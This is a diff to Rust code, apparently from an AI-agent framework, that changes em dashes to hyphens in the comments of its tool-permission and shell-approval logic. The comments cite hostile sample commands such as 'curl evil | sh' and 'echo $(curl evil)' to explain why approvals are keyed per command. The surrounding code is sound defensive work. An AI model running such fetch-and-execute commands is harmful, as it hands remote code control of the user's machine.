@@ -61,7 +61,7 @@ impl ToolRegistry {
                 {
                     Ok(header) => header,
                     Err(e) => {
-                        tracing::warn!(server = %server_cfg.name, error = %e, "MCP auth unavailable — skipping");
+                        tracing::warn!(server = %server_cfg.name, error = %e, "MCP auth unavailable - skipping");
                         continue;
                     }
                 };
@@ -117,7 +117,7 @@ impl ToolRegistry {
                         let _enter = span.enter();
                         span.record("server", tracing::field::display(&server_cfg.name));
                         span.record("error", tracing::field::display(&e));
-                        tracing::warn!("Failed to connect MCP server — skipping");
+                        tracing::warn!("Failed to connect MCP server - skipping");
                     }
                 }
             }
@@ -151,7 +151,7 @@ impl ToolRegistry {
 }
 
 /// Current Unix time in seconds, for token-expiry checks. `0` if the clock is
-/// somehow before the epoch — which reads every token as expired and forces a
+/// somehow before the epoch - which reads every token as expired and forces a
 /// refresh attempt, the safe direction.
 pub(crate) fn unix_now_secs() -> u64 {
     std::time::SystemTime::now()
@@ -212,7 +212,7 @@ pub fn default_tool_policy(tool_name: &str, is_builtin: bool) -> ToolPolicy {
         // through this function at all is the *config*, not the prompt.
         //
         // They used to skip policy resolution entirely, so a user's
-        // `[tool_permissions] spawn_agent = "deny"` was silently ignored — the
+        // `[tool_permissions] spawn_agent = "deny"` was silently ignored - the
         // "a configured deny is terminal" guarantee did not cover these five
         // names. That is the hole worth closing, and it is closed by being here.
         //
@@ -226,7 +226,7 @@ pub fn default_tool_policy(tool_name: &str, is_builtin: bool) -> ToolPolicy {
         "spawn_agent" | "check_agent" | "wait_for_agent" | "send_to_agent" | "kill_agent" => {
             ToolPolicy::Allow
         }
-        // These tools ARE the human-in-the-loop mechanism — gating them behind
+        // These tools ARE the human-in-the-loop mechanism - gating them behind
         // a separate tool-approval prompt would mean asking the user "may I
         // ask you something?" before actually asking them.
         "ask_user_text" | "ask_user_choice" | "ask_user_confirm" | "edit_document" => {
@@ -260,8 +260,8 @@ fn stricter(a: ToolPolicy, b: ToolPolicy) -> ToolPolicy {
 
 /// Resolve the effective policy for a tool call.
 ///
-/// Scope order is narrowest-first — stage, then agent, then the user's global
-/// config, then the built-in default — but *narrower does not mean stronger*.
+/// Scope order is narrowest-first - stage, then agent, then the user's global
+/// config, then the built-in default - but *narrower does not mean stronger*.
 /// The stage and agent layers come out of `agent.leviath`, which for any agent
 /// installed with `lev add` is a file the user downloaded. So a blueprint may
 /// only ever **tighten** what the user configured, never loosen it: whatever the
@@ -270,12 +270,12 @@ fn stricter(a: ToolPolicy, b: ToolPolicy) -> ToolPolicy {
 ///
 /// Only an *explicitly configured* global entry acts as a ceiling. A tool the
 /// user has said nothing about falls through to [`default_tool_policy`], and a
-/// blueprint is free to set it — otherwise no shipped agent could pre-approve
+/// blueprint is free to set it - otherwise no shipped agent could pre-approve
 /// its own tools (the researcher's `web_fetch = "allow"` would stop working) and
 /// the model would become a wall rather than a floor.
 ///
 /// A user who wants to grant one specific agent more than their global setting
-/// says so in their own config, keyed by agent name — see
+/// says so in their own config, keyed by agent name - see
 /// [`crate::config::Config::permissions_for_agent`], which is folded into
 /// `global_permissions` at spawn.
 ///
@@ -307,7 +307,7 @@ pub fn resolve_policy(
         (None, None) => default_tool_policy(tool_name, is_builtin),
     };
 
-    // A `Deny` is terminal — no launch flag lifts it.
+    // A `Deny` is terminal - no launch flag lifts it.
     if configured == ToolPolicy::Deny {
         return ToolPolicy::Deny;
     }
@@ -324,7 +324,7 @@ pub fn resolve_policy(
 ///
 /// Session approval used to key on the bare tool name, so approving one `shell`
 /// call approved *every* later `shell` call for the run. "Allow `ls` for this
-/// session" silently became "allow `curl evil | sh` for this session" — the user
+/// session" silently became "allow `curl evil | sh` for this session" - the user
 /// consented to one thing and granted another.
 ///
 /// So a shell approval is keyed on what actually runs: for each command in the
@@ -336,7 +336,7 @@ pub fn resolve_policy(
 /// Chained commands are split rather than refused. The first version returned
 /// `None` for anything containing `&&`, `|`, `;`, `$(` or a redirect, on the
 /// grounds that the leading words of `foo && curl evil` do not characterize it.
-/// True — but a coding agent writes compound commands constantly, and in a real
+/// True - but a coding agent writes compound commands constantly, and in a real
 /// run *every* shell call it made was compound, so "allow for this session"
 /// never once applied and the user re-approved the same work over and over.
 /// Splitting keeps the security property (`curl` is its own key, and is not
@@ -373,7 +373,7 @@ pub fn session_approval_keys(tool_name: &str, arguments: &serde_json::Value) -> 
 /// (`>`, `<`) ends the part that names a program, and what follows is a
 /// filename rather than a command, so it is dropped. Command substitution
 /// (`$(...)`, backticks) runs a command whose text is *inside* the current one,
-/// so its contents are lifted out and treated as their own segments — otherwise
+/// so its contents are lifted out and treated as their own segments - otherwise
 /// `echo $(curl evil)` would grant only `echo`.
 ///
 /// Returns empty when the line cannot be read this way, which is the signal to
@@ -389,11 +389,11 @@ fn command_segments(command: &str) -> Vec<String> {
 
     // `str::get` rather than `&s[a..b]` throughout: the workspace denies raw
     // string slicing (a non-boundary index panics), and here every `None` has
-    // the same honest answer — a line we cannot read is one we will not grant.
+    // the same honest answer - a line we cannot read is one we will not grant.
     while let Some((before, after_open)) = rest.split_once("$(") {
         current.push_str(before);
         let Some((inner, after)) = split_at_matching_paren(after_open) else {
-            return Vec::new(); // unbalanced — not a line we can read
+            return Vec::new(); // unbalanced - not a line we can read
         };
         // The substituted command is its own segment (recursively).
         segments.extend(command_segments(inner));
@@ -424,7 +424,7 @@ fn command_segments(command: &str) -> Vec<String> {
 /// command, and everything after the paren. `None` when it is unbalanced.
 ///
 /// Returns the two halves rather than an index so the caller never does its own
-/// slicing — the workspace denies raw string indexing, and an `Option` per index
+/// slicing - the workspace denies raw string indexing, and an `Option` per index
 /// would add branches that cannot be taken (a `char_indices` offset is always a
 /// boundary) and so could never be covered.
 fn split_at_matching_paren(s: &str) -> Option<(&str, &str)> {
@@ -452,7 +452,7 @@ fn split_at_matching_paren(s: &str) -> Option<(&str, &str)> {
 /// makes the grant useless: `echo "exit code: $?"` and `echo "done"` would be
 /// two different grants for the same harmless program, and a run full of
 /// progress `echo`s would re-prompt on every one. A path-like or bare word stays
-/// in the key — `python3 test.py` should not grant `python3 evil.py`.
+/// in the key - `python3 test.py` should not grant `python3 evil.py`.
 fn command_prefix(command: &str) -> Option<String> {
     let mut words = command.split_whitespace();
     let program = words.next()?;
@@ -485,7 +485,7 @@ mod mcp_registry_tests {
     // A minimal MCP server speaking just enough JSON-RPC over stdio to
     // satisfy `initialize` / `notifications/initialized` / `tools/list`,
     // mirroring `leviath-mcp/src/discovery.rs`'s own `STUB_INIT_AND_LIST`
-    // test fixture -- a real (but fast, local, no-network) subprocess round
+    // test fixture - a real (but fast, local, no-network) subprocess round
     // trip rather than a fake/mocked `ToolExecutor`.
     const STUB_INIT_AND_LIST: &str = r#"
 import sys, json
@@ -674,7 +674,7 @@ for line in sys.stdin:
     #[tokio::test]
     async fn build_skips_mcp_server_that_fails_to_connect() {
         // A nonexistent command fails to spawn, exercising the `Err(e)` arm
-        // ("Failed to connect MCP server -- skipping") instead of the
+        // ("Failed to connect MCP server - skipping") instead of the
         // success arm above.
         with_tracing(|| {});
         let registry = with_temp_home(|| async {
@@ -721,7 +721,7 @@ for line in sys.stdin:
     }
 
     /// A locked keychain costs the MCP servers that need OAuth, not every tool
-    /// the agent has -- so the read path warns and carries on.
+    /// the agent has - so the read path warns and carries on.
     #[test]
     fn an_unreachable_credential_store_warns_rather_than_failing_tool_setup() {
         assert!(
@@ -772,7 +772,7 @@ mod policy_tests {
 
     #[test]
     fn test_default_policy_ask_user_tools_allow_by_default() {
-        // These tools ARE the human-in-the-loop mechanism — they must not
+        // These tools ARE the human-in-the-loop mechanism - they must not
         // require a separate approval prompt before asking the user.
         assert_eq!(
             default_tool_policy("ask_user_text", true),
@@ -844,7 +844,7 @@ mod policy_tests {
     /// downloaded; letting its `[stages.x.tool_permissions]` overrule the user's
     /// own `[tool_permissions]` meant an installed agent could self-grant the
     /// shell the user had explicitly denied. (This test previously asserted the
-    /// opposite — that stage "beats" global — which is the bug, not the design.)
+    /// opposite - that stage "beats" global - which is the bug, not the design.)
     #[test]
     fn test_resolve_policy_stage_cannot_loosen_global() {
         let mut stage = HashMap::new();
@@ -863,7 +863,7 @@ mod policy_tests {
     }
 
     /// The ceiling is only what the user *explicitly* configured. A tool they
-    /// have said nothing about is still the blueprint's to set — otherwise the
+    /// have said nothing about is still the blueprint's to set - otherwise the
     /// shipped researcher agent could not pre-approve its own `web_fetch`.
     #[test]
     fn test_resolve_policy_blueprint_free_when_user_silent() {
@@ -919,7 +919,7 @@ mod policy_tests {
         assert_eq!(policy, ToolPolicy::Deny);
     }
 
-    /// A blueprint's own `deny` is terminal too — an agent that declares it
+    /// A blueprint's own `deny` is terminal too - an agent that declares it
     /// never needs a tool doesn't get handed it by an unattended `--yolo`.
     #[test]
     fn test_yolo_does_not_override_blueprint_deny() {
@@ -998,7 +998,7 @@ mod policy_tests {
         assert_eq!(policy, ToolPolicy::Deny);
     }
 
-    /// A global `ask` still bounds a blueprint's `allow` — the user gets their
+    /// A global `ask` still bounds a blueprint's `allow` - the user gets their
     /// prompt rather than silent execution.
     #[test]
     fn test_resolve_policy_global_ask_bounds_blueprint_allow() {
@@ -1177,8 +1177,8 @@ mod policy_tests {
         assert_ne!(keys("git diff HEAD~1"), keys("git push --force"));
     }
 
-    /// A flag does not narrow what the program is, so it is not part of the key
-    /// — otherwise `ls -la` and `ls -l` would prompt separately for no benefit.
+    /// A flag does not narrow what the program is, so it is not part of the key -
+    /// otherwise `ls -la` and `ls -l` would prompt separately for no benefit.
     #[test]
     fn flags_are_not_part_of_the_prefix() {
         assert_eq!(keys("cargo test --lib"), ["shell:cargo test"]);
@@ -1188,7 +1188,7 @@ mod policy_tests {
 
     /// A compound line grants one key per command in it. The first version
     /// refused these outright, and in a real run *every* shell call a coding
-    /// agent made was compound — so "allow for this session" never once applied
+    /// agent made was compound - so "allow for this session" never once applied
     /// and the same work was re-approved over and over.
     #[test]
     fn a_compound_line_grants_each_command_in_it() {
@@ -1245,7 +1245,7 @@ mod policy_tests {
         assert!(nested.iter().any(|k| k == "shell:whoami"), "{nested:?}");
     }
 
-    /// A redirect names a file, not a program — `> /tmp/out` must not become a
+    /// A redirect names a file, not a program - `> /tmp/out` must not become a
     /// key, and must not stop the command before it from being one.
     #[test]
     fn a_redirect_target_is_not_a_command() {
@@ -1327,7 +1327,7 @@ mod policy_tests {
         assert_eq!(policy, ToolPolicy::Allow);
     }
 
-    /// It does not outrank a stage's `deny` — see
+    /// It does not outrank a stage's `deny` - see
     /// `test_yolo_does_not_override_blueprint_deny` for the rationale.
     #[test]
     fn test_resolve_policy_launch_cannot_override_stage_deny() {
@@ -1613,7 +1613,7 @@ mod policy_tests {
 
     // ─── resolve_policy full chain: all four levels present ───────────────
 
-    /// With every level saying `deny`, nothing lifts it — not the stage, not the
+    /// With every level saying `deny`, nothing lifts it - not the stage, not the
     /// agent, not `--allow`. Previously this asserted `Allow`, i.e. that a launch
     /// flag beat a unanimous deny.
     #[test]
